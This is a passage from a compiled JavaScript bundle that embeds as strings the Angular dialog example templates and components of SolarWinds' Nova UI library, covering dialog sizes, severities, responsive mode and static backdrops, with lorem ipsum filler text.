posuere.\n            Etiam at pulvinar enim, nec interdum purus. Duis elit metus,\n            lobortis vitae quam a, malesuada cursus quam. Duis vel lacinia\n            purus. Maecenas eget arcu ac ante sagittis eleifend vel ut purus.\n            Pellentesque sit amet semper ipsum, eu vulputate tortor. Aliquam\n            vitae nisi augue. Duis non erat sit amet sem venenatis accumsan at\n            ullamcorper lorem. Morbi non turpis nibh.\n        </p>\n\n        <p i18n>\n            Quisque ut pellentesque augue. Ut finibus malesuada lacus, a\n            elementum odio eleifend ac. Duis faucibus vehicula elit.\n            Pellentesque id metus enim. Praesent vestibulum ipsum vel venenatis\n            vehicula. Donec vel erat ex. Vivamus porta risus vitae risus tempus\n            accumsan.\n        </p>\n\n        <p i18n>\n            Duis euismod erat id metus euismod, interdum iaculis turpis tempus.\n            Nulla facilisi. Pellentesque ut purus nec lorem aliquam dictum ut\n            sit amet enim. Mauris laoreet vel mi eget suscipit. Aliquam ipsum\n            lacus, varius sed felis non, aliquet ultrices nisl. In tincidunt\n            quam sed faucibus vulputate. Lorem ipsum dolor sit amet, consectetur\n            adipiscing elit. Duis pellentesque elit sem, id aliquet metus\n            egestas sit amet. Maecenas quis justo in turpis lacinia aliquet.\n            Donec dignissim dolor nunc, in ultricies ligula sodales tincidunt.\n            Phasellus in nisi ac metus rutrum efficitur eu sed mi. Praesent et\n            porta leo. Curabitur sed maximus lectus. Aenean ac ex metus. Integer\n            facilisis id sapien quis sodales. Nam at eros sapien.\n        </p>\n\n        <p i18n>\n            Mauris consequat lectus diam. Cras auctor vestibulum lectus, id\n            pharetra nisl dapibus id. Sed tempor enim vel diam tincidunt\n            condimentum. Ut elementum, ante in ultricies pulvinar, elit metus\n            faucibus mauris, eu sodales lectus risus sit amet odio. Sed\n            ullamcorper maximus ante, ut lobortis libero rutrum lacinia. Nam\n            pretium erat ac velit egestas rutrum ultrices vel libero. Etiam\n            sollicitudin tempus leo. Quisque a elit a orci fringilla molestie.\n            Curabitur luctus dui risus, eget commodo lectus ullamcorper sit\n            amet. Nulla turpis ante, venenatis tempor ex semper, semper\n            vulputate enim. Duis sem nulla, egestas eu rhoncus et, egestas\n            malesuada neque.\n        </p>\n\n        <p i18n>\n            Fusce ut malesuada est. Ut ut placerat nunc. Vivamus mauris nisi,\n            luctus nec turpis quis, luctus porta ante. Aliquam erat volutpat.\n            Nulla facilisi. Maecenas id vehicula sem. Sed vitae sodales orci,\n            sed pretium mauris. Maecenas orci est, volutpat sit amet elit in,\n            gravida finibus justo. Vestibulum eget eros id risus elementum\n            interdum eu quis nisi. Donec ullamcorper enim tincidunt, volutpat\n            sem et, gravida sem. Fusce vitae tellus mauris. Nam non bibendum\n            urna. Ut vel pellentesque est, quis egestas ex. Nam lobortis quam\n            eget arcu tristique, id suscipit enim volutpat. Quisque pretium vel\n            nisl eu aliquet.\n        </p>\n    </div>\n    <nui-dialog-footer>\n        <button nui-button type="button" (click)="onButtonClick(\'Cancel\')" i18n>\n            Cancel\n        </button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="primary"\n            (click)="onButtonClick(\'Action\')"\n            i18n\n        >\n            Action\n        </button>\n    </nui-dialog-footer>\n</ng-template>\n\n<button\n    id="long-dialog"\n    nui-button\n    type="button"\n    (click)="open(content, { isResponsiveMode: false })"\n    i18n\n>\n    Default mode\n</button>\n<button\n    id="responsive-dialog"\n    class="ml-4"\n    nui-button\n    type="button"\n    (click)="open(content, { isResponsiveMode: true })"\n    i18n\n>\n    Responsive mode\n</button>\n'},32785:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, TemplateRef } from "@angular/core";\n\nimport { DialogService, NuiDialogRef, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-dialog-position-example",\n    templateUrl: "./dialog-position.example.component.html",\n})\nexport class DialogPositionExampleComponent {\n    public isResponsiveMode = false;\n    private activeDialog: NuiDialogRef;\n\n    constructor(\n        @Inject(DialogService) private dialogService: DialogService,\n        @Inject(ToastService) private toastService: ToastService\n    ) {}\n\n    public open(content: TemplateRef<string>, options: any): void {\n        this.isResponsiveMode = options.isResponsiveMode;\n        this.activeDialog = this.dialogService.open(content);\n    }\n\n    public onButtonClick(title: string): void {\n        title === "Action" ? this.actionDone() : this.actionCanceled();\n        this.activeDialog.close();\n    }\n\n    private actionDone(): void {\n        this.toastService.success({\n            message: $localize`Action Done!`,\n            title: $localize`Event`,\n        });\n    }\n\n    private actionCanceled(): void {\n        this.toastService.info({\n            message: $localize`Action Cancelled!`,\n            title: $localize`Event`,\n        });\n    }\n}\n'},21677:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #content let-close="close">\n    <nui-dialog-header\n        title="Dialog title"\n        i18n-title\n        [severity]="severity"\n        (closed)="close()"\n    ></nui-dialog-header>\n    <div class="dialog-body">\n        <p i18n>\n            Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam\n            maximus faucibus bibendum. Aenean feugiat interdum leo sed posuere.\n            Etiam at pulvinar enim, nec interdum purus. Duis elit metus,\n            lobortis vitae quam a, malesuada cursus quam. Duis vel lacinia\n            purus. Maecenas eget arcu ac ante sagittis eleifend vel ut purus.\n            Pellentesque sit amet semper ipsum, eu vulputate tortor. Aliquam\n            vitae nisi augue. Duis non erat sit amet sem venenatis accumsan at\n            ullamcorper lorem. Morbi non turpis nibh.\n        </p>\n    </div>\n    <nui-dialog-footer>\n        <button\n            nui-button\n            type="button"\n            [isEmpty]="false"\n            (click)="onButtonClick(\'Cancel\')"\n            i18n\n        >\n            Cancel\n        </button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="primary"\n            [isEmpty]="false"\n            (click)="onButtonClick(\'Action\')"\n            i18n\n        >\n            Action\n        </button>\n    </nui-dialog-footer>\n</ng-template>\n\n<button\n    id="nui-demo-critical-dialog-btn"\n    nui-button\n    type="button"\n    (click)="open(content, \'critical\')"\n    i18n\n>\n    Show Critical\n</button>\n<button\n    id="nui-demo-warning-dialog-btn"\n    class="ml-4"\n    nui-button\n    type="button"\n    (click)="open(content, \'warning\')"\n    i18n\n>\n    Show Warning\n</button>\n<button\n    id="nui-demo-info-dialog-btn"\n    class="ml-4"\n    nui-button\n    type="button"\n    (click)="open(content, \'info\')"\n    i18n\n>\n    Show Info\n</button>\n'},4793:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, TemplateRef } from "@angular/core";\n\nimport { DialogService, NuiDialogRef, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-dialog-severity-example",\n    templateUrl: "./dialog-severity.example.component.html",\n})\nexport class DialogSeverityExampleComponent {\n    public severity: string;\n    private activeDialog: NuiDialogRef;\n\n    constructor(\n        @Inject(DialogService) private dialogService: DialogService,\n        @Inject(ToastService) private toastService: ToastService\n    ) {}\n\n    public open(content: TemplateRef<string>, severity = ""): void {\n        this.severity = severity;\n        this.activeDialog = this.dialogService.open(content, { size: "sm" });\n    }\n\n    public onButtonClick(title: string): void {\n        title === "Action" ? this.actionDone() : this.actionCanceled();\n        this.activeDialog.close();\n    }\n\n    private actionDone(): void {\n        this.toastService.success({\n            message: $localize`Action Done!`,\n            title: $localize`Event`,\n        });\n    }\n\n    private actionCanceled(): void {\n        this.toastService.info({\n            message: $localize`Action Cancelled!`,\n            title: $localize`Event`,\n        });\n    }\n}\n'},84761:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #content let-close="close">\n    <nui-dialog-header\n        title="Dialog title"\n        i18n-title\n        (closed)="close()"\n    ></nui-dialog-header>\n    <div class="dialog-body">\n        <p i18n>\n            Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam\n            maximus faucibus bibendum. Aenean feugiat interdum leo sed posuere.\n            Etiam at pulvinar enim, nec interdum purus. Duis elit metus,\n            lobortis vitae quam a, malesuada cursus quam. Duis vel lacinia\n            purus. Maecenas eget arcu ac ante sagittis eleifend vel ut purus.\n            Pellentesque sit amet semper ipsum, eu vulputate tortor. Aliquam\n            vitae nisi augue. Duis non erat sit amet sem venenatis accumsan at\n            ullamcorper lorem. Morbi non turpis nibh.\n        </p>\n    </div>\n    <nui-dialog-footer>\n        <button nui-button type="button" (click)="onButtonClick(\'Cancel\')" i18n>\n            Cancel\n        </button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="primary"\n            (click)="onButtonClick(\'Action\')"\n            i18n\n        >\n            Action\n        </button>\n    </nui-dialog-footer>\n</ng-template>\n\n<button\n    id="nui-demo-small-dialog-btn"\n    nui-button\n    type="button"\n    (click)="open(content, \'sm\')"\n>\n    Show Small Dialog\n</button>\n<button\n    id="nui-demo-medium-dialog-btn"\n    class="ml-4"\n    nui-button\n    type="button"\n    (click)="open(content, \'md\')"\n>\n    Show Medium Dialog\n</button>\n<button\n    id="nui-demo-large-dialog-btn"\n    class="ml-4"\n    nui-button\n    type="button"\n    (click)="open(content, \'lg\')"\n>\n    Show Large Dialog\n</button>\n'},84181:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, TemplateRef } from "@angular/core";\n\nimport { DialogService, NuiDialogRef, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-dialog-sizes-example",\n    templateUrl: "./dialog-sizes.example.component.html",\n})\nexport class DialogSizesExampleComponent {\n    private activeDialog: NuiDialogRef;\n\n    constructor(\n        @Inject(DialogService) private dialogService: DialogService,\n        @Inject(ToastService) private toastService: ToastService\n    ) {}\n\n    public open(content: TemplateRef<string>, size: any): void {\n        this.activeDialog = this.dialogService.open(content, { size });\n    }\n\n    public onButtonClick(title: string): void {\n        title === "Action" ? this.actionDone() : this.actionCanceled();\n        this.activeDialog.close();\n    }\n\n    private actionDone(): void {\n        this.toastService.success({\n            message: $localize`Action Done!`,\n            title: $localize`Event`,\n        });\n    }\n\n    private actionCanceled(): void {\n        this.toastService.info({\n            message: $localize`Action Cancelled!`,\n            title: $localize`Event`,\n        });\n    }\n}\n'},72526:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<ng-template #content let-close="close" let-dismiss="dismiss">\n    <nui-dialog-header\n        title="Dialog title"\n        i18n-title\n        (closed)="close()"\n    ></nui-dialog-header>\n    <div class="dialog-body">\n        <p i18n>\n            Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nullam\n            maximus faucibus bibendum. Aenean feugiat interdum leo sed posuere.\n            Etiam at pulvinar enim, nec interdum purus. Duis elit metus,\n            lobortis vitae quam a, malesuada cursus quam. Duis vel lacinia\n            purus. Maecenas eget arcu ac ante sagittis eleifend vel ut purus.\n            Pellentesque sit amet semper ipsum, eu vulputate tortor. Aliquam\n            vitae nisi augue. Duis non erat sit amet sem venenatis accumsan at\n            ullamcorper lorem. Morbi non turpis nibh.\n        </p>\n    </div>\n    <nui-dialog-footer>\n        <button\n            nui-button\n            type="button"\n            (click)="actionCanceled(); close()"\n            i18n\n        >\n            Cancel\n        </button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="primary"\n            (click)="actionDone(); close()"\n            i18n\n        >\n            Action\n        </button>\n    </nui-dialog-footer>\n</ng-template>\n\n<p>\n    This example blocks the user from closing the dialog with a click outside of\n    the dialog. Still able to close via the ESC key or dialog\n    <code>Cancel</code> and <code>Close</code> buttons:\n</p>\n<button\n    id="nui-demo-static-backdrop-dialog-btn"\n    nui-button\n    type="button"\n    (click)="openWith(content)"\n    i18n\n>\n    Static Backdrop Only\n</button>\n<p class="mt-3">\n    This example allows the user to close the dialog only with the\n    <code>Cancel</code> and <code>Close</code> buttons:\n</p>\n<button\n    id="nui-demo-static-backdrop-ESC-dialog-btn"\n    nui-button\n    type="button"\n    (click)="openWithout(content)"\n    i18n\n>\n    Static Backdrop + ESC Key\n</button>\n'},74570:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject, TemplateRef } from "@angular/core";\n\nimport { DialogService, NuiDialogRef, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-dialog-with-static-backdrop-example",\n    templateUrl: "./dialog-with-static-backdrop.example.component.html",\n})\nexport class DialogWithStaticBackdropExampleComponent {\n    private activeDialog: NuiDialogRef;\n\n    constructor(\n        @Inject(DialogService) private dialogService: DialogService,\n        @Inject(ToastService) private toastService: ToastService\n    ) {}\n\n    public openWith(content: TemplateRef<string>): void {\n        this.activeDialog = this.dialogService.open(content, {\n            size: "sm",\n            backdrop: "static",\n        });\n    }\n    public openWithout(content: TemplateRef<string>): void {\n        this.activeDialog = this.dialogService.open(content, {\n            size: "sm",\n            keyboard: false,\n            backdrop: "static",\n        });\n    }\n\n    public actionDone(): void {\n        this.toastService.success({\n            message: $localize`Action Done!`,\n            title: $localize`Event`,\n        });\n        this.activeDialog.close();\n    }\n\n    public actionCanceled(): void {\n        this.toastService.info({\n            message: $localize`Action Cancelled!`,\n            title: $localize`Event`,\n        });\n        this.activeDialog.close();\n    }\n}\n'},58513:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="<nui-simple-dialog-example></nui-simple-dialog-example>\n\n<nui-dialog-with-keyboard-example></nui-dialog-with-keyboard-example>\n\n<nui-dialog-severity-example></nui-dialog-severity-example>\n\n<nui-dialog-custom-class-example></nui-dialog-custom-class-example>\n\n<nui-dialog-with-static-backdrop-example></nui-dialog-with-static-backdrop-example>\n\n<nui-dialog-inside-overlay-example></nui-dialog-inside-overlay-example>\n\n<nui-dialog-inside-overlay-with-date-time-picker-example></nui-dialog-inside-overlay-with-date-time-picker-example>\n"},64701:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    templateUrl: "./dialog-test.example.component.html",\n})\nexport class DialogTestComponent {}\n'},17207:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div>\n        <ng-template #content let-close="close">\n            <nui-dialog-header\n                title="Dialog title"\n                [severity]="severity"\n                (closed)="close()"\n            >\n            </nui-dialog-header>\n            <div class="dialog-body">\n                <p>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Nullam maximus faucibus bibendum. Aenean feugiat interdum\n                    leo sed posuere. Etiam at pulvinar enim, nec interdum purus.\n                    Duis elit metus, lobortis vitae quam a, malesuada cursus\n                    quam. Duis vel lacinia purus. Maecenas eget arcu ac ante\n                    sagittis eleifend vel ut purus. Pellentesque sit amet semper\n                    ipsum, eu vulputate tortor. Aliquam vitae nisi augue. Duis\n                    non erat sit amet sem venenatis accumsan at ullamcorper\n                    lorem. Morbi non turpis nibh.\n                </p>\n            </div>\n            <nui-dialog-footer>\n                <button\n                    nui-button\n                    type="button"\n                    [isEmpty]="false"\n                    (click)="onButtonClick(\'Cancel\')"\n                >\n                    Cancel\n                </button>\n                <button\n                    nui-button\n                    type="button"\n                    displayStyle="primary"\n                    [isEmpty]="false"\n                    (click)="onButtonClick(\'Action\')"\n                >\n                    Action\n                </button>\n            </nui-dialog-footer>\n        </ng-template>\n\n        <div>\n            <h3>Basic Dialog</h3>\n            <button\n                id="nui-visual-test-default-dialog-btn"\n                (click)="open(content)"\n            >\n                Click me!\n            </button>\n            <hr />\n        </div>\n\n        <div>\n            <h3>Dialogs with Different Severity</h3>\n            <button\n                id="nui-visual-test-critical-dialog-btn"\n                (click)="open(content, \'critical\')"\n            >\n                Show Critical\n            </button>\n            <button\n                id="nui-visual-test-warning-dialog-btn"\n                (click)="open(content, \'warning\')"\n            >\n                Show Warning\n            </button>\n            <button\n                id="nui-visual-test-info-dialog-btn"\n                (click)="open(content, \'info\')"\n            >\n                Show Info\n            </button>\n            <hr />\n        </div>\n\n        <div>\n            <h3>Dialogs with Different Sizes</h3>\n            <button\n                id="nui-visual-test-small-dialog-btn"\n                (click)="openSizes(content, \'sm\')"\n            >\n                Show Small Dialog\n            </button>\n            <button\n                id="nui-visual-test-medium-dialog-btn"\n                (click)="openSizes(content, \'md\')"\n            >\n                Show Medium Dialog\n            </button>\n            <button\n                id="nui-visual-test-large-dialog-btn"\n                (click)="openSizes(content, \'lg\')"\n            >\n                Show Large Dialog\n            </button>\n            <hr />\n        </div>\n    </div>\n\n    <div>\n        <ng-template #headerButtonsContent let-close="close">\n            <nui-dialog-header title="Dialog title" (closed)="close()">\n                <button\n                    nui-button\n                    type="button"\n                    displayStyle="action"\n                    icon="fullscreen"\n                ></button>\n                <button\n                    nui-button\n                    type="button"\n                    displayStyle="action"\n                    icon="menu"\n                ></button>\n            </nui-dialog-header>\n            <div class="dialog-body">\n                <p>\n                    <nui-select\n                        id="nui-visual-basic-select"\n                        [itemsSource]="dataset.items"\n                        placeholder="Select item"\n                    ></nui-select>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Nullam maximus faucibus bibendum. Aenean feugiat interdum\n                    leo sed posuere. Etiam at pulvinar enim, nec interdum purus.\n                    Duis elit metus, lobortis vitae quam a, malesuada cursus\n                    quam. Duis vel lacinia purus. Maecenas eget arcu ac ante\n                    sagittis eleifend vel ut purus. Pellentesque sit amet semper\n                    ipsum, eu vulputate tortor. Aliquam vitae nisi augue. Duis\n                    non erat sit amet sem venenatis accumsan at ullamcorper\n                    lorem. Morbi non turpis nibh.\n                </p>\n            </div>\n            <nui-dialog-footer>\n                <button\n                    nui-button\n                    type="button"\n                    (click)="onButtonClick(\'Cancel\')"\n                >\n                    Cancel\n                </button>\n                <button\n                    nui-button\n                    type="button"\n                    displayStyle="primary"\n                    (click)="onButtonClick(\'Action\')"\n                >\n                    Action\n                </button>\n            </nui-dialog-footer>\n        </ng-template>\n\n        <div>\n            <h3>Custom Dialog Header</h3>\n            <button\n                id="nui-visual-test-custom-actions-dialog-btn"\n                (click)="open(headerButtonsContent)"\n            >\n                More actions\n            </button>\n            <hr />\n        </div>\n    </div>\n\n    <div>\n        <h3>Confirmation Dialogs with Defaults and Overrides</h3>\n        <button\n            id="nui-visual-test-confirmation-dialog-defaults-btn"\n            (click)="confirmationDefaults()"\n        >\n            Show Confirmation with defaults\n        </button>\n        <button\n            id="nui-visual-test-confirmation-dialog-overrides-btn"\n            (click)="confirmationOverrides()"\n        >\n            Show Confirmation with overrides\n        </button>\n        <hr />\n    </div>\n\n    <div>\n        <ng-template #contentResponsiveMode let-close="close">\n            <nui-dialog-header\n                title="Dialog title"\n                (closed)="close()"\n            ></nui-dialog-header>\n            <div\n                class="dialog-body"\n                [ngClass]="{ \'responsive-mode\': isResponsiveMode }"\n            >\n                <p>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Nullam maximus faucibus bibendum. Aenean feugiat interdum\n                    leo sed posuere. Etiam at pulvinar enim, nec interdum purus.\n                    Duis elit metus, lobortis vitae quam a, malesuada cursus\n                    quam. Duis vel lacinia purus. Maecenas eget arcu ac ante\n                    sagittis eleifend vel ut purus. Pellentesque sit amet semper\n                    ipsum, eu vulputate tortor. Aliquam vitae nisi augue. Duis\n                    non erat sit amet sem venenatis accumsan at ullamcorper\n                    lorem. Morbi non turpis nibh.\n                </p>\n\n                <p>\n                    Quisque ut pellentesque augue. Ut finibus malesuada lacus, a\n                    elementum odio eleifend ac. Duis faucibus vehicula elit.\n                    Pellentesque id metus enim. Praesent vestibulum ipsum vel\n                    venenatis vehicula. Donec vel erat ex. Vivamus porta risus\n                    vitae risus tempus accumsan.\n                </p>\n\n                <p>\n                    Duis euismod erat id metus euismod, interdum iaculis turpis\n                    tempus. Nulla facilisi. Pellentesque ut purus nec lorem\n                    aliquam dictum ut sit amet enim. Mauris laoreet vel mi eget\n                    suscipit. Aliquam ipsum lacus, varius sed felis non, aliquet\n                    ultrices nisl. In tincidunt quam sed faucibus vulputate.\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Duis pellentesque elit sem, id aliquet metus egestas sit\n                    amet. Maecenas quis justo in turpis lacinia aliquet. Donec\n                    dignissim dolor nunc, in ultricies ligula sodales tincidunt.\n                    Phasellus in nisi ac metus rutrum efficitur eu sed mi.\n                    Praesent et porta leo. Curabitur sed maximus lectus. Aenean\n                    ac ex metus. Integer facilisis id sapien quis sodales. Nam\n                    at eros sapien.\n                </p>\n\n                <p>\n                    Mauris consequat lectus diam. Cras auctor vestibulum lectus,\n                    id pharetra nisl dapibus id. Sed tempor enim vel diam\n                    tincidunt condimentum. Ut elementum, ante in ultricies\n                    pulvinar, elit metus faucibus mauris, eu sodales lectus\n                    risus sit amet odio. Sed ullamcorper maximus ante, ut\n                    lobortis libero rutrum lacinia. Nam pretium erat ac velit\n                    egestas rutrum ultrices vel libero. Etiam sollicitudin\n                    tempus leo. Quisque a elit a orci fringilla molestie.\n                    Curabitur luctus dui risus, eget commodo lectus ullamcorper\n                    sit amet. Nulla turpis ante, venenatis tempor ex semper,\n                    semper vulputate enim. Duis sem nulla, egestas eu rhoncus\n                    et, egestas malesuada neque.\n                </p>\n\n                <p>\n                    Fusce ut malesuada est. Ut ut placerat nunc. Vivamus mauris\n                    nisi, luctus nec turpis quis, luctus porta ante. Aliquam\n                    erat volutpat. Nulla facilisi. Maecenas id vehicula sem. Sed\n                    vitae sodales orci, sed pretium mauris. Maecenas orci est,\n                    volutpat sit amet elit in, gravida finibus justo. Vestibulum\n                    eget eros id risus elementum interdum eu quis nisi. Donec\n                    ullamcorper enim tincidunt, volutpat sem et, gravida sem.\n                    Fusce vitae tellus mauris. Nam non bibendum urna. Ut vel\n                    pellentesque est, quis egestas ex. Nam lobortis quam eget\n                    arcu tristique, id suscipit enim volutpat. Quisque pretium\n                    vel nisl eu aliquet.\n                </p>\n\n                <p>\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Nullam maximus faucibus bibendum. Aenean feugiat interdum\n                    leo sed posuere. Etiam at pulvinar enim, nec interdum purus.\n                    Duis elit metus, lobortis vitae quam a, malesuada cursus\n                    quam. Duis vel lacinia purus. Maecenas eget arcu ac ante\n                    sagittis eleifend vel ut purus. Pellentesque sit amet semper\n                    ipsum, eu vulputate tortor. Aliquam vitae nisi augue. Duis\n                    non erat sit amet sem venenatis accumsan at ullamcorper\n                    lorem. Morbi non turpis nibh.\n                </p>\n\n                <p>\n                    Quisque ut pellentesque augue. Ut finibus malesuada lacus, a\n                    elementum odio eleifend ac. Duis faucibus vehicula elit.\n                    Pellentesque id metus enim. Praesent vestibulum ipsum vel\n                    venenatis vehicula. Donec vel erat ex. Vivamus porta risus\n                    vitae risus tempus accumsan.\n                </p>\n\n                <p>\n                    Duis euismod erat id metus euismod, interdum iaculis turpis\n                    tempus. Nulla facilisi. Pellentesque ut purus nec lorem\n                    aliquam dictum ut sit amet enim. Mauris laoreet vel mi eget\n                    suscipit. Aliquam ipsum lacus, varius sed felis non, aliquet\n                    ultrices nisl. In tincidunt quam sed faucibus vulputate.\n                    Lorem ipsum dolor sit amet, consectetur adipiscing elit.\n                    Duis pellentesque elit sem, id aliquet metus egestas sit\n                    amet. Maecenas quis justo in turpis lacinia aliquet. Donec\n                    dignissim dolor nunc, in ultricies ligula sodales tincidunt.\n                    Phasellus in nisi ac metus rutrum efficitur eu sed mi.\n                    Praesent et porta leo. Curabitur sed maximus lectus. Aenean\n                    ac ex metus. Integer facilisis id sapien quis sodales. Nam\n                    at eros sapien.\n                </p>\n\n                <p>\n                    Mauris consequat lectus diam. Cras auctor vestibulum lectus,\n                    id pharetra nisl dapibus id. Sed tempor enim vel diam\n                    tincidunt condimentum. Ut elementum, ante in ultricies\n                    pulvinar, elit metus faucibus mauris, eu sodales lectus\n                    risus sit amet odio. Sed ullamcorper maximus ante, ut\n                    lobortis libero rutrum lacinia. Nam pretium erat ac velit\n                    egestas rutrum ultrices vel libero. Etiam sollicitudin\n                    tempus leo. Quisque a elit a orci fringilla molestie.\n                    Curabitur luctus dui risus, eget commodo lectus ullamcorper\n                    sit amet. Nulla turpis ante, venenatis tempor ex semper,\n                    semper vulputate enim. Duis sem nulla, egestas eu rhoncus\n                    et, egestas malesuada neque.\n                </p>\n\n                